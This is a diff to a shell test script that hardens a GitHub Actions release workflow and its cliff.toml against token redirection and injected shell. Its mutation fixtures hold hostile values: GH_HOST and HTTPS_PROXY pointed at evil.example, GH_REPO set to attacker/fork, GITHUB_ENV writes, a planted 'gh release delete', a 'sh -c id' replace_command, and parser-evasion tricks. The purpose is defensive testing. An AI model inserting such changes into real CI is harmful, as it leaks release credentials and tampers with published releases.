@@ -16,7 +16,8 @@
 #     hand `contents: write` to a fork's branch),
 #   - `contents: write` lives on the release job and nowhere wider,
 #   - every `uses:` is a GitHub-owned action pinned to a 40-hex SHA, and the
-#     checkout pin is the SAME one ci.yml carries (they bump together),
+#     checkout pin is the SAME one ci.yml carries (they bump together); the
+#     SET of actions is pinned too - actions/checkout and nothing else,
 #   - git-cliff arrives as a version-pinned, sha256-VERIFIED tarball in a
 #     `run:` step - never a third-party action, never a floating `latest`,
 #   - no `${{ }}` interpolation inside a `run:` block (script injection),
@@ -26,6 +27,14 @@
 #     feed - both of these, and the rest of the release command, by pinning
 #     the release step's whole `run:` block byte for byte, the only `run:`
 #     allowed to mention `gh`,
+#   - the known ways to redirect that block's token or change how it runs
+#     are rejected: its step's keys and env are pinned, the job's keys are
+#     pinned, no env or defaults sit above it, no GH_* key sits anywhere else,
+#     no step writes $GITHUB_ENV or $GITHUB_PATH, and git-cliff is called by
+#     its absolute path, never through the PATH. A tripwire for accidental
+#     edits, not an adversarial boundary: an earlier step can still plant a
+#     `gh` without $GITHUB_PATH (a user-writable PATH directory, sudo into
+#     /usr/bin, ~/.config/gh) - review and commit signing are the control,
 #   - no step is exit-suppressed, and
 #   - cliff.toml keeps the two properties the notes depend on: conventional
 #     commits only, and merge commits skipped.
@@ -84,97 +93,53 @@ else
   echo "SKIP: python3 unavailable (or --print-expected-run failed) - the pinned-literal drift check not run"
 fi
 
-# The PyYAML-free floor for the release step - the ONLY layer when PyYAML is
-# missing, so it stands on its own. It reads the RAW file ($1), never the
-# comment-filtered $commands (dropping comment lines first would change what a
-# block holds), and does no shell parsing at all:
-#   - every `run:` key must be a plain literal block (`run: |`, nothing after
-#     the `|`), so each block's text is exactly the more-indented lines under
-#     it, dedented by its first line's indentation (YAML's own rule) with
-#     trailing blank lines clipped (what `|` does) - no folding, no escapes;
-#   - `gh` as a word outside every run: block is allowed only on a YAML comment
-#     line, which catches a `run:` hidden in a flow mapping or a quoted key;
-#   - each step holds at most ONE `run:` key (PyYAML keeps the last of a
-#     duplicate, so a gh-free second block would otherwise replace the one
-#     this floor checked);
-#   - exactly ONE block mentions `gh` as a word, found by content, not by the
-#     step's name, so a rename cannot empty the check. A comment cannot hide a
-#     second `gh` from this count; a deliberately obfuscated spelling (`g\h`,
-#     `"g"h`, a `g\`-newline-`h` split) can, since bash runs each as gh. This
-#     is a tripwire for accidental edits, not an adversarial boundary - review
-#     and commit signing are the control there;
-#   - that block equals $RELEASE_RUN_EXPECTED byte for byte. A file with no
-#     final newline leaves YAML's `|` nothing to keep at EOF, so a block
-#     ending there has no trailing newline (Python sees exactly that); awk
-#     cannot tell a missing final newline apart, so the shell measures it with
-#     `tail -c 1` and passes it in as `nonl`.
-# Anything it cannot read that way fails closed. POSIX awk only (match/RLENGTH,
-# index, split, ENVIRON): the macOS legs run BSD awk. On failure it prints one
-# line and exits 1; the difference message matches the Python layer's, so a
-# fixture can grep the same text from both.
+# The release step's keys and env, as the floor sees them: every line of the
+# step outside its run: block, blank and comment lines dropped, dedented to the
+# step's `-`. Only the name's VALUE is free (`<any>`). Stricter than the
+# Python layer, which pins the key set and the env mapping but not the name:
+# this literal also pins key order, env order and each value's spelling. The keys
+# this leaves out are the point: `shell:` (another interpreter for the pinned
+# text), `working-directory:`, `if:`, `continue-on-error:` (a skipped or failed
+# release that reads green), and any env entry beyond these three (GH_HOST,
+# GH_REPO pointed elsewhere). Edit it together with the Python layer's env and
+# key-set checks.
+IFS= read -r -d '' RELEASE_STEP_EXPECTED <<'EOF' || true
+- name: <any>
+  env:
+    GH_TOKEN: ${{ github.token }}
+    GH_REPO: ${{ github.repository }}
+    TAG: ${{ github.ref_name }}
+  run: |
+EOF
+
+# The git-cliff (notes) step, in the same form. Its env is exactly TAG: a
+# GIT_CLIFF__* variable overrides any cliff.toml setting, postprocessors (and
+# their replace_command) included, so cliff_shell_check below would be
+# checking a file git-cliff no longer obeys. Edit it together with the Python
+# layer's notes-step check.
+IFS= read -r -d '' NOTES_STEP_EXPECTED <<'EOF' || true
+- name: <any>
+  env:
+    TAG: ${{ github.ref_name }}
+  run: |
+EOF
+
+# The PyYAML-free floor: tests/release_workflow_floor.awk, whose header lists
+# what it checks and why. A separate file so the program reads as awk, not as
+# a quoted shell string; it is still in bin/check-patterns arm 8's scope (no
+# GNU regex escapes). LC_ALL=C: the floor rejects every byte outside printable
+# ASCII, which must mean bytes, not locale characters. The file's last byte is
+# measured here and passed in as `nonl`: awk cannot tell a missing final
+# newline apart, and YAML's `|` keeps no trailing line break at EOF without one.
+floor_awk="$repo_root/tests/release_workflow_floor.awk"
+[ -f "$floor_awk" ] || fail "floor program missing: tests/release_workflow_floor.awk"
 release_run_check() {
   local nonl=0
   # `$(...)` strips a trailing newline, so a non-empty result means the last
   # byte is something else.
   if [ -n "$(tail -c 1 "$1")" ]; then nonl=1; fi
-  RELEASE_RUN_EXPECTED="$RELEASE_RUN_EXPECTED" awk -v nonl="$nonl" '
-    function lead(s) { match(s, /^ */); return RLENGTH }
-    function isgh(s) { return s ~ /(^|[^A-Za-z0-9_])gh([^A-Za-z0-9_]|$)/ }
-    function close_block() {
-      if (!inblk) return
-      inblk = 0
-      if (hasgh) { ngh++; ghbody = body; ghseen = ghseen " [" firstgh "]" }
-    }
-    {
-      if (inblk) {
-        if ($0 ~ /^ *$/) {
-          # A blank line; its spaces past the block indentation are content.
-          pend = pend ((cont >= 0 && length($0) > cont) ? substr($0, cont + 1) : "") "\n"
-          next
-        }
-        ind = lead($0)
-        if (ind > key) {
-          if (cont < 0) cont = ind
-          if (ind < cont) { if (bad == "") bad = "line " NR " is under-indented inside a run: block"; next }
-          line = substr($0, cont + 1)
-          body = body pend line "\n"; pend = ""
-          if (!hasgh && isgh(line)) { hasgh = 1; firstgh = line }
-          next
-        }
-        close_block()
-      }
-      # A `- ` sequence entry opens a new mapping whose keys sit at the column
-      # after the dash; remember which entry owns each key column, so a second
-      # run: key in the SAME step is told apart from one in the next step.
-      if (match($0, /^ *- +/)) item[RLENGTH] = NR
-      if ($0 ~ /^ *(- +)?run:/) {
-        if ($0 !~ /^ *(- +)?run: \|$/) {
-          if (bad == "") bad = "line " NR " is a run: key that is not a plain literal block (run: |)"
-          next
-        }
-        key = index($0, "run:") - 1
-        if (nrun[key SUBSEP item[key]]++ && bad == "") bad = "line " NR " is a second run: key in the same step"
-        inblk = 1; cont = -1; body = ""; pend = ""; hasgh = 0; firstgh = ""
-        next
-      }
-      if (isgh($0) && $0 !~ /^ *#/ && bad == "") bad = "line " NR " mentions gh outside any run: block"
-    }
-    END {
-      # Clip keeps the last content line break only if the file has one.
-      if (inblk && nonl && pend == "") body = substr(body, 1, length(body) - 1)
-      close_block()
-      if (bad != "") { print bad; exit 1 }
-      if (ngh != 1) { print "expected exactly one run: block mentioning gh, found " ngh ":" ghseen; exit 1 }
-      want = ENVIRON["RELEASE_RUN_EXPECTED"]
-      if (ghbody == want) exit 0
-      ng = split(ghbody, g, "\n"); nw = split(want, w, "\n")
-      m = (ng < nw) ? ng : nw
-      for (k = 1; k <= m; k++) if (g[k] != w[k]) break
-      print "the release step\047s run: differs from the pinned literal at line " k ": got: " \
-        (k <= ng ? g[k] : "<end>") " | expected: " (k <= nw ? w[k] : "<end>")
-      exit 1
-    }
-  ' "$1"
+  RELEASE_RUN_EXPECTED="$RELEASE_RUN_EXPECTED" RELEASE_STEP_EXPECTED="$RELEASE_STEP_EXPECTED" \
+    NOTES_STEP_EXPECTED="$NOTES_STEP_EXPECTED" LC_ALL=C awk -v nonl="$nonl" -f "$floor_awk" "$1"
 }
 
 # --- Existence ----------------------------------------------------------------
@@ -248,7 +213,7 @@ ok "git-cliff is a version-pinned, sha256-verified tarball in a run: step"
 release_run_err="$(release_run_check "$wf")" || fail "$release_run_err"
 grep -q -- '--config cliff.toml' <<<"$commands" \
   || fail "git-cliff must read the repository's cliff.toml explicitly (--config)"
-ok "the release step's run: block is exactly the pinned literal, and the only one mentioning gh"
+ok "the release step's run: block and step match the pinned literals, it is the only gh block, and the context checks pass"
 
 # --- Nothing is exit-suppressed ------------------------------------------------
 release_lines="$(grep -E '(git-cliff|gh release create|sha256sum)' <<<"$commands" || true)"
@@ -269,6 +234,57 @@ grep -Eq '\{[[:space:]]*message[[:space:]]*=[[:space:]]*"\^Merge ",[[:space:]]*s
 grep -Eq '^[[:space:]]*commit_parsers[[:space:]]*=' "$cliff" \
   || fail "cliff.toml must group commits by type (commit_parsers)"
 ok "cliff.toml is conventional-commits only, merge commits skipped, grouped by type"
+
+# cliff.toml can make git-cliff run shell on the release runner: a
+# `replace_command` (inside commit_preprocessors or postprocessors) is run
+# through `sh -c`. Neither shell hook is used, so any `replace_command` fails,
+# and every `*processors` key must be an empty `[]` - a non-empty list is where
+# a replace_command would go. A TOML quoted key may spell a name with \u / \U
+# (and, in TOML 1.1, \xHH) escapes, which no grep for `replace_command` can
+# read, so any such escape fails too, and so does a Tera get_env() call.
+#
+# The replace_command, escape and get_env greps read the RAW file, comments
+# included. Inside a TOML multi-line string (""" or '''), a line that looks
+# like a comment - a Markdown `# heading`, or `text # ...` - is template text
+# that Tera renders into the public notes, and telling it from a real comment
+# needs a TOML parser this floor does not have. A comment that merely mentions
+# one of the three is therefore rejected: that fails closed.
+#
+# The *processors check alone reads $body, the file with a whole comment line
+# and a trailing `#...` with no quote after it dropped (a `#` inside a
+# single-line string always has its closing quote after it, so a string is
+# never cut). That strip is sound here: it only ever removes text, so it can
+# drop a list's closing `]` (and reject) but never manufacture one, and a
+# `processors` line inside a """ string is template text, not a key. Reading
+# raw would instead reject a legal `commit_preprocessors = []  # note`.
+#
+# Measured on the real file: one `commit_preprocessors = []`, no
+# postprocessors, and 0 raw hits for replace_command, get_env, or a \u, \U or
+# \x escape (its `### Breaking changes` heading sits inside the body """
+# string). Prints every problem, one per line, and returns 1.
+cliff_shell_check() {
+  local body procs rc=0
+  body="$(sed -E -e '/^[[:space:]]*#/d' -e "s/#[^\"']*\$//" "$1")"
+  if grep -q 'replace_command' "$1"; then
+    echo "cliff.toml uses replace_command - git-cliff runs it as a shell command"; rc=1
+  fi
+  if grep -qE '\\[uUx]' "$1"; then
+    echo "cliff.toml has a \\u, \\U or \\x escape - an escaped key can spell replace_command"; rc=1
+  fi
+  # Tera's get_env() reads the runner's environment at render time, and the
+  # rendered notes are published: a template calling it can print a secret.
+  if grep -q 'get_env' "$1"; then
+    echo "cliff.toml calls get_env - it can print the runner's env into the public notes"; rc=1
+  fi
+  procs="$(grep -E 'processors' <<<"$body" || true)"
+  if [ -n "$procs" ] \
+    && grep -vE '^[[:space:]]*[A-Za-z_.]*processors[[:space:]]*=[[:space:]]*\[[[:space:]]*\][[:space:]]*$' <<<"$procs" >/dev/null; then
+    echo "cliff.toml has a non-empty *processors list - the place a replace_command runs shell"; rc=1
+  fi
+  return "$rc"
+}
+cliff_err="$(cliff_shell_check "$cliff")" || fail "$cliff_err"
+ok "cliff.toml runs no shell (raw file: no replace_command, escape or get_env; every *processors list empty)"
 
 
 # --- Well-formedness + structure (PyYAML; loud skip when absent) --------------
@@ -394,7 +410,7 @@ mutate note-bs 's|^\( *\)\(cat "\$RUNNER_TEMP/notes.md"\)$|\1\2\
 expect_both_reject "# note \\ then gh release edit in another step" "$mut_dir/note-bs.yml" \
   "found 2: ['Generate the release notes'" 'found 2: [gh release edit "$TAG" --title x]'
 
-mutate extra-gh 's|^\( *\)\(echo "\$RUNNER_TEMP/bin" >> "\$GITHUB_PATH"\)$|\1\2\
+mutate extra-gh 's|^\( *\)\(chmod u+x "\$RUNNER_TEMP/bin/git-cliff"\)$|\1\2\
 \1gh release delete "$TAG" --yes|' 'gh release delete'
 expect_both_reject "an extra gh line in an earlier step" "$mut_dir/extra-gh.yml" \
   "found 2: ['Install git-cliff" 'found 2: [gh release delete "$TAG" --yes]'
@@ -427,6 +443,419 @@ printf '%s' "$(cat "$wf")" > "$mut_dir/no-eol.yml"
 [ -n "$(tail -c 1 "$mut_dir/no-eol.yml")" ] || fail "fixture bug: the no-eol mutation did not apply"
 expect_both_reject "a file with no final newline" "$mut_dir/no-eol.yml" \
   'differs from the pinned literal at line 9: got: <end>' 'differs from the pinned literal at line 9: got: <end>'
+
+# --- The release step's execution context --------------------------------------
+# The run: literal pins the argv. These pin what can redirect the token-bearing
+# gh call, or change how the pinned block runs, without touching that block:
+# env at the workflow, job or step level, the release step's own keys, the
+# job's keys, the cross-step channels ($GITHUB_ENV, $GITHUB_PATH), how
+# git-cliff is called, and the set of actions that could be handed a token.
+head_at() { printf '%s' "the release step differs from the pinned step at line $1: got: $2"; }
+
+# gh reads GH_HOST (and GH_ENTERPRISE_TOKEN for that host), so an env above the
+# release step sends the token elsewhere with the step itself untouched.
+mutate job-env-gh 's|^\(    timeout-minutes: 15\)$|\1\
+    env: {GH_HOST: evil.example, GH_ENTERPRISE_TOKEN: "${{ github.token }}"}|' 'env: {GH_HOST: evil.example'
+expect_both_reject "a job-level env setting GH_HOST" "$mut_dir/job-env-gh.yml" \
+  "got ['env', 'name', 'permissions', 'runs-on', 'steps', 'timeout-minutes']" \
+  "sets a GH_* key outside the release step's env"
+
+mutate wf-env-gh 's|^jobs:$|env:\
+  GH_HOST: evil.example\
+jobs:|' '  GH_HOST: evil.example'
+expect_both_reject "a workflow-level env setting GH_HOST" "$mut_dir/wf-env-gh.yml" \
+  "got ['env', 'jobs', 'name', 'on', 'permissions']" \
+  "sets a GH_* key outside the release step's env"
+
+# No GH_* key at all: a proxy is enough to route the call. Only a step may set
+# env, so the floor rejects it by where the key sits, not by its name.
+mutate job-env-proxy 's|^\(    timeout-minutes: 15\)$|\1\
+    env:\
+      HTTPS_PROXY: http://evil.example:3128|' 'HTTPS_PROXY'
+expect_both_reject "a job-level env with no GH_* key" "$mut_dir/job-env-proxy.yml" \
+  "got ['env', 'name', 'permissions', 'runs-on', 'steps', 'timeout-minutes']" \
+  'is an env: key outside a step'
+
+# Flow form, so no `run:` line trips the floor's block reader by accident.
+mutate job-defaults 's|^\(    timeout-minutes: 15\)$|\1\
+    defaults: {run: {shell: bash}}|' 'defaults: {run'
+expect_both_reject "a job-level defaults (run.shell)" "$mut_dir/job-defaults.yml" \
+  "got ['defaults', 'name', 'permissions', 'runs-on', 'steps', 'timeout-minutes']" \
+  'sets defaults:'
+
+# Upper case, so the gh-as-a-word count never sees it.
+mutate github-env 's|^\( *\)\(cat "\$RUNNER_TEMP/notes.md"\)$|\1\2\
+\1echo GH_HOST=evil.example >> "$GITHUB_ENV"|' '>> "$GITHUB_ENV"'
+expect_both_reject 'an earlier step writing GH_HOST to $GITHUB_ENV' "$mut_dir/github-env.yml" \
+  "step 'Generate the release notes' mentions GITHUB_ENV" 'mentions GITHUB_ENV'
+
+# A directory on $GITHUB_PATH precedes /usr/bin for every later step, so a
+# `gh` planted there would run in the release step, holding the token. Even
+# the directory git-cliff lands in: the workflow calls it by absolute path.
+mutate github-path 's|^\( *\)\(chmod u+x "\$RUNNER_TEMP/bin/git-cliff"\)$|\1\2\
+\1echo "$RUNNER_TEMP/bin" >> "$GITHUB_PATH"|' '>> "$GITHUB_PATH"'
+expect_both_reject 'a $GITHUB_PATH write (the old git-cliff entry)' "$mut_dir/github-path.yml" \
+  "step 'Install git-cliff (pinned, sha256-verified)' mentions GITHUB_PATH" 'mentions GITHUB_PATH'
+
+# gh only runs in the release step, but a GH_* key anywhere else is where a
+# later edit would move it from; both layers keep GH_* to the pinned env.
+# The install step's env: the notes step's env is pinned whole (see below).
+mutate other-env-gh 's|^\( *\)\(GIT_CLIFF_SHA256: [0-9a-f]*\)$|\1\2\
+\1GH_HOST: evil.example|' '          GH_HOST: evil.example'
+expect_both_reject "GH_HOST in another step's env" "$mut_dir/other-env-gh.yml" \
+  "step 'Install git-cliff (pinned, sha256-verified)' sets ['GH_HOST'] in its env:" \
+  "sets a GH_* key outside the release step's env"
+
+mutate with-gh 's|^\( *\)\(fetch-depth: 0\)$|\1\2\
+\1GH_HOST: evil.example|' '          GH_HOST: evil.example'
+expect_both_reject "GH_HOST in the checkout's with:" "$mut_dir/with-gh.yml" \
+  "step 'Checkout' sets ['GH_HOST'] in its with:" \
+  "sets a GH_* key outside the release step's env"
+
+# The release step's own env: where the token goes, and to which repository.
+mutate step-gh-repo 's|GH_REPO: \${{ github.repository }}|GH_REPO: attacker/fork|' 'GH_REPO: attacker/fork'
+expect_both_reject "GH_REPO pointed at another repository" "$mut_dir/step-gh-repo.yml" \
+  "'GH_REPO': 'attacker/fork'" "$(head_at 4 '    GH_REPO: attacker/fork')"
+
+mutate step-gh-host 's|^\( *\)\(GH_REPO: \${{ github.repository }}\)$|\1\2\
+\1GH_HOST: evil.example|' 'GH_HOST: evil.example'
+expect_both_reject "GH_HOST added to the release step's env" "$mut_dir/step-gh-host.yml" \
+  "'GH_HOST': 'evil.example'" "$(head_at 5 '    GH_HOST: evil.example')"
+
+# Step keys that change how the pinned block runs, or whether it counts.
+for kv in 'shell: bash' 'continue-on-error: true' 'if: false' 'working-directory: /tmp'; do
+  k="${kv%%:*}"
+  mutate "step-$k" 's|^\( *\)\(- name: Create the release\)$|\1\2\
+\1  '"$kv"'|' "  $kv"
+  case "$k" in
+    continue-on-error) py_keys="['continue-on-error', 'env', 'name', 'run']" ;;
+    if) py_keys="['env', 'if', 'name', 'run']" ;;
+    *) py_keys="['env', 'name', 'run', '$k']" ;;
+  esac
+  expect_both_reject "$kv on the release step" "$mut_dir/step-$k.yml" \
+    "hold only name, env and run, got $py_keys" "$(head_at 2 "  $kv")"
+done
+
+# A pinned GitHub-owned action is still code that can be handed the token and
+# never spells gh: the set of actions is pinned, not just their shape.
+mutate script-step 's|^\( *\)\(- name: Create the release\)$|\1- name: Script\
+\1  uses: actions/github-script@0123456789abcdef0123456789abcdef01234567\
+\1\2|' 'actions/github-script@'
+expect_both_reject "an extra SHA-pinned actions/github-script step" "$mut_dir/script-step.yml" \
+  "got ['actions/checkout', 'actions/github-script']" 'expected exactly one uses: key, found 2'
+
+mutate checkout-tag 's|actions/checkout@[0-9a-f]*|actions/checkout@v7|' 'actions/checkout@v7 '
+expect_both_reject "a checkout pinned to a tag, not a SHA" "$mut_dir/checkout-tag.yml" \
+  "must be pinned to a 40-hex commit SHA, got 'actions/checkout@v7'" \
+  'is not actions/checkout pinned to a 40-hex SHA'
+
+# An explicit key (`? run` / `: |`) is a second run: key the floor's `run:`
+# matcher cannot see; PyYAML keeps the last value, so it replaces the block.
+{ cat "$wf"; printf '%s\n' '        ? run' '        : |' '          echo replaced'; } > "$mut_dir/explicit-key.yml"
+grep -Fq -- '? run' "$mut_dir/explicit-key.yml" || fail "fixture bug: the explicit-key mutation did not apply"
+expect_both_reject "an explicit ? run key after the release block" "$mut_dir/explicit-key.yml" \
+  'found 0: []' 'is not a single-line plain key: line'
+
+# A whitespace-only line with MORE spaces than the block indentation is
+# content to YAML, not a blank line: `|` keeps it, trailing or not.
+{ cat "$wf"; printf '%s\n' '            '; } > "$mut_dir/ws-content.yml"
+[ "$(tail -n 1 "$mut_dir/ws-content.yml")" = '            ' ] || fail "fixture bug: the ws-content mutation did not apply"
+m="$(diff_at 9 '  ') | expected: "
+expect_both_reject "a trailing whitespace-only line deeper than the block" "$mut_dir/ws-content.yml" "$m" "$m"
+
+# --- Key spellings the floor cannot read, and the job's own keys ------------
+# Every floor rule matches a key by its literal spelling. PyYAML resolves a tag,
+# an anchor or an escape to the same key, so each of these is a real `env:` or
+# `uses:` to GitHub; the floor's shape rule rejects the spelling itself.
+mutate tag-env 's|^\(    timeout-minutes: 15\)$|\1\
+    !!str env: {HTTPS_PROXY: http://evil.example:3128}|' '!!str env:'
+expect_both_reject "a tagged job-level key (!!str env:)" "$mut_dir/tag-env.yml" \
+  "got ['env', 'name', 'permissions', 'runs-on', 'steps', 'timeout-minutes']" 'is not a single-line plain key: line'
+
+mutate esc-env 's|^\(    timeout-minutes: 15\)$|\1\
+    "e\\x6ev": {HTTPS_PROXY: http://evil.example:3128}|' '"e\x6ev":'
+expect_both_reject 'an escaped job-level key ("e\x6ev":)' "$mut_dir/esc-env.yml" \
+  "got ['env', 'name', 'permissions', 'runs-on', 'steps', 'timeout-minutes']" 'is not a single-line plain key: line'
+
+mutate anchor-uses 's|^\( *\)\(- name: Create the release\)$|\1- name: Script\
+\1  \&u uses: actions/github-script@0123456789abcdef0123456789abcdef01234567\
+\1\2|' '&u uses:'
+expect_both_reject "an anchored step key (&u uses:)" "$mut_dir/anchor-uses.yml" \
+  "got ['actions/checkout', 'actions/github-script']" 'is not a single-line plain key: line'
+
+# A value that is an anchor, alias or tag is resolved by PyYAML, never read by
+# the floor; the shape rule rejects the value's first character.
+mutate anchor-value 's|^\(    timeout-minutes: 15\)$|\1\
+    env: \&e {HTTPS_PROXY: http://evil.example:3128}|' 'env: &e {'
+expect_both_reject "an anchored job-level value (env: &e {...})" "$mut_dir/anchor-value.yml" \
+  "got ['env', 'name', 'permissions', 'runs-on', 'steps', 'timeout-minutes']" \
+  'has a value starting with an anchor, alias or tag'
+
+# A job key the Python layer's JOB_KEYS does not list: `container:` runs every
+# step, the release step included, inside an image of the workflow's choosing.
+mutate job-container 's|^\(    timeout-minutes: 15\)$|\1\
+    container: ubuntu:24.04|' 'container: ubuntu'
+expect_both_reject "a job-level container:" "$mut_dir/job-container.yml" \
+  "got ['container', 'name', 'permissions', 'runs-on', 'steps', 'timeout-minutes']" \
+  'is job key container'
+
+# The same at the top level: a workflow-level key reaches the release job.
+for kv in 'container: ubuntu:24.04' 'if: false'; do
+  k="${kv%%:*}"
+  mutate "wf-$k" 's|^jobs:$|'"$kv"'\
+jobs:|' "$kv"
+  case "$k" in
+    container) py_keys="['container', 'jobs', 'name', 'on', 'permissions']" ;;
+    *) py_keys="['if', 'jobs', 'name', 'on', 'permissions']" ;;
+  esac
+  expect_both_reject "a workflow-level $k:" "$mut_dir/wf-$k.yml" \
+    "top-level keys must be exactly ['jobs', 'name', 'on', 'permissions'], got $py_keys" \
+    "is top-level key $k"
+done
+
+# --- git-cliff by its absolute path ---------------------------------------------
+# A bare name resolves through the PATH, the very thing no step may extend.
+mutate cliff-bare 's|"\$RUNNER_TEMP/bin/git-cliff" --config cliff.toml --tag "\$TAG" --latest|git-cliff --config cliff.toml --tag "$TAG" --latest|' \
+  'git-cliff --config cliff.toml --tag "$TAG" --latest'
+expect_both_reject "a bare git-cliff call" "$mut_dir/cliff-bare.yml" \
+  'git-cliff is called by a bare name' 'calls git-cliff by a bare name'
+
+mutate cliff-path 's|"\$RUNNER_TEMP/bin/git-cliff" --config cliff.toml --tag "\$TAG" --latest|"$RUNNER_TEMP/git-cliff" --config cliff.toml --tag "$TAG" --latest|' \
+  '"$RUNNER_TEMP/git-cliff" --config'
+expect_both_reject "a git-cliff call by another path" "$mut_dir/cliff-path.yml" \
+  'expected exactly 2 git-cliff calls by absolute path' 'expected exactly 2 git-cliff calls by absolute path'
+
+# --- GITHUB_ENV outside run: ---------------------------------------------------
+# A step's `shell:` template is a command line too; Python reads every string
+# in the step, the floor every line that is not a YAML comment.
+mutate shell-env 's|^\( *\)\(- name: Generate the release notes\)$|\1\2\
+\1  shell: "bash -e {0}; echo GH_HOST=evil.example >> $GITHUB_ENV"|' 'shell: "bash -e {0}; echo'
+expect_both_reject 'a shell: template writing $GITHUB_ENV' "$mut_dir/shell-env.yml" \
+  "step 'Generate the release notes' mentions GITHUB_ENV" 'mentions GITHUB_ENV'
+
+# --- Negative controls: what the context rules must NOT reject -----------------
+mutate comment-env 's|^\( *\)\(# shell\.\)$|\1\2\
+\1# Nothing here writes GITHUB_ENV or GITHUB_PATH.|' '# Nothing here writes GITHUB_ENV'
+expect_both_accept "a YAML comment naming GITHUB_ENV and GITHUB_PATH" "$mut_dir/comment-env.yml"
+
+mutate mygh 's|^\( *\)\(GIT_CLIFF_SHA256: [0-9a-f]*\)$|\1\2\
+\1MYGH_TOKEN: unrelated|' 'MYGH_TOKEN: unrelated'
+expect_both_accept "an env key that merely contains GH_ (MYGH_TOKEN)" "$mut_dir/mygh.yml"
+
+# --- The floor reports every problem, not the first ---------------------------
+mutate multi 's|^\(    timeout-minutes: 15\)$|\1\
+    defaults: {run: {shell: bash}}|
+s|^\( *\)\(cat "\$RUNNER_TEMP/notes.md"\)$|\1\2\
+\1echo X=1 >> "$GITHUB_ENV"|' 'X=1 >> "$GITHUB_ENV"'
+if out="$(release_run_check "$mut_dir/multi.yml")"; then
+  fail "release_run_check must reject defaults: plus a \$GITHUB_ENV write, but it accepted it"
+fi
+grep -Fq -- 'sets defaults:' <<<"$out" \
+  || fail "release_run_check did not report the defaults: line among several problems: $out"
+grep -Fq -- 'mentions GITHUB_ENV' <<<"$out" \
+  || fail "release_run_check did not report the GITHUB_ENV line among several problems: $out"
+ok "the floor reports both of two problems (defaults: and a \$GITHUB_ENV write)"
+
+# --- cliff.toml shell hooks ------------------------------------------------------
+cliff_fixture() {
+  local label="$1" file="$2" msg="$3" out
+  if out="$(cliff_shell_check "$file")"; then fail "cliff_shell_check must reject $label, but it accepted it"; fi
+  grep -Fq -- "$msg" <<<"$out" || fail "cliff_shell_check rejected $label for an unrelated reason (wanted: $msg): $out"
+  ok "cliff.toml check rejects $label"
+}
+sed 's|^commit_preprocessors = \[\]$|commit_preprocessors = [\
+  { pattern = ".*", replace_command = "sh -c id" },\
+]|' "$cliff" > "$mut_dir/cliff-cmd.toml"
+grep -Fq -- 'replace_command' "$mut_dir/cliff-cmd.toml" || fail "fixture bug: the cliff-cmd mutation did not apply"
+cliff_fixture "a replace_command" "$mut_dir/cliff-cmd.toml" 'uses replace_command'
+
+sed 's|^commit_preprocessors = \[\]$|commit_preprocessors = [{ pattern = "a", replace = "b" }]|' "$cliff" > "$mut_dir/cliff-proc.toml"
+grep -Fq -- 'replace = "b"' "$mut_dir/cliff-proc.toml" || fail "fixture bug: the cliff-proc mutation did not apply"
+cliff_fixture "a non-empty commit_preprocessors" "$mut_dir/cliff-proc.toml" 'non-empty *processors list'
+
+# --- Bytes, repeats, the notes step, cliff.toml escapes ---------------------
+# The floor is stricter than PyYAML on a few VALID layouts it cannot read line
+# by line. Each such fixture asserts that the floor rejects it with its own
+# message and that PyYAML accepts it - the strictness is deliberate and
+# measured, not an accident.
+expect_floor_only_reject() {
+  local label="$1" mut_file="$2" sh_msg="$3" out
+  if out="$(release_run_check "$mut_file")"; then
+    fail "release_run_check (the floor) must reject $label, but it accepted it"
+  fi
+  grep -Fq -- "$sh_msg" <<<"$out" \
+    || fail "release_run_check rejected $label for an unrelated reason (wanted: $sh_msg): $out"
+  if [ "$have_yaml" -eq 1 ]; then
+    out="$(python3 "$check_py" "$mut_file" 2>&1)" \
+      || fail "release_workflow_check.py was expected to accept $label (the floor alone is stricter), but it rejected it: $out"
+  fi
+  ok "the floor alone rejects $label"
+}
+
+# A bare CR is a line break to YAML but not to awk: this hides a job-level
+# env inside what the floor would otherwise read as the timeout-minutes line.
+cr="$(printf '\r')"
+mutate cr-env "s|^\\(    timeout-minutes: 15\\)\$|\\1${cr}    env:${cr}      HTTPS_PROXY: http://evil.example:3128|" 'HTTPS_PROXY'
+expect_both_reject "a bare CR hiding a job-level env" "$mut_dir/cr-env.yml" \
+  "got ['env', 'name', 'permissions', 'runs-on', 'steps', 'timeout-minutes']" \
+  'holds a byte outside printable ASCII'
+
+# Repeats: PyYAML keeps the LAST of a duplicate key, silently.
+{ cat "$wf"; printf '%s\n' 'permissions:' '  contents: write'; } > "$mut_dir/dup-top.yml"
+grep -Fq -- 'contents: write' "$mut_dir/dup-top.yml" || fail "fixture bug: the dup-top mutation did not apply"
+expect_both_reject "a repeated top-level permissions:" "$mut_dir/dup-top.yml" \
+  'top-level permissions must be contents: read' 'repeats top-level key permissions'
+
+mutate dup-job-key 's|^\(    timeout-minutes: 15\)$|\1\
+    runs-on: ubuntu-24.04|' 'runs-on: ubuntu-24.04'
+expect_both_reject "a repeated job key (runs-on)" "$mut_dir/dup-job-key.yml" \
+  "must run on ubuntu-latest, got 'ubuntu-24.04'" 'repeats job key runs-on'
+
+{ cat "$wf"; printf '%s\n' '  other:' '    runs-on: ubuntu-latest'; } > "$mut_dir/second-job.yml"
+grep -Fq -- '  other:' "$mut_dir/second-job.yml" || fail "fixture bug: the second-job mutation did not apply"
+expect_both_reject "a second job" "$mut_dir/second-job.yml" \
+  'must define exactly one job' 'is a second job'
+
+# The steps list written at the job's key column (`    - name:` under
+# `    steps:`) is valid YAML with the same meaning; the floor, which tells a
+# job key from a step by its column, refuses it.
+sed '/^    steps:$/,$ s/^      /    /' "$wf" > "$mut_dir/seq-jobcol.yml"
+grep -q '^    - name: Checkout$' "$mut_dir/seq-jobcol.yml" || fail "fixture bug: the seq-jobcol mutation did not apply"
+expect_floor_only_reject "the steps list at the job's key column" "$mut_dir/seq-jobcol.yml" \
+  "is a sequence entry at the job's key column"
+
+# The `jobs:` line goes through every rule, like any other line: a trailing
+# comment naming gh is not a YAML comment LINE, so the gh rule rejects it.
+mutate jobs-gh 's/^jobs:$/jobs: # gh/' 'jobs: # gh'
+expect_floor_only_reject "jobs: # gh" "$mut_dir/jobs-gh.yml" 'mentions gh outside any run: block'
+
+# A lone `---` before the first key only opens the one document.
+mutate doc-start 's/^name: Release$/---\
+name: Release/' '---'
+expect_both_accept "a --- document marker before the first key" "$mut_dir/doc-start.yml"
+
+# The notes step's env is exactly TAG: a GIT_CLIFF_* variable reconfigures
+# git-cliff (GIT_CLIFF_CONFIG names another config file; a GIT_CLIFF__* one
+# overrides any setting, and is also banned outright, below), so the
+# cliff.toml checks would guard a file git-cliff no longer obeys.
